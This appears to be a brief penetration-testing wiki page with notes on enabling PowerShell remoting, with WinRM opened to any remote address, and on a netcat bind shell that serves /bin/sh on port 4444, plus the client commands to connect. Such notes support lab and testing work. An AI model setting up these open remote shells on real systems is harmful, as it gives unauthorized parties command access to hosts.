# penetration-wiki

## PS-Session

### Server Settings

- username = `easyduck`
- password = `verystrongpassword`
- hostname = `rhostname`
- ipaddress = `xxx.xxx.xxx.xxx`

```pwsh
Enable-PSRemoting
Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP-PUBLIC" -RemoteAddress Any
net start WinRM
```

### Client

pattern 1

```pwsh
Enter-PSSession -ComputerName "xxx.xxx.xxx.xxx" -Credential "easyduck"
```

pattern 2

```pwsh
Enter-PSSession -ComputerName "hostname"-Credential "easyduck"
```

## Netcat

## Server Settings

- RPORT = `4444`
- RHOST = `xxx.xxx.xxx.xxx`

```bash
nc -lvp 4444 -e /bin/sh
```

## Client

```bash
nc xxx.xxx.xxx.xxx 4444
```
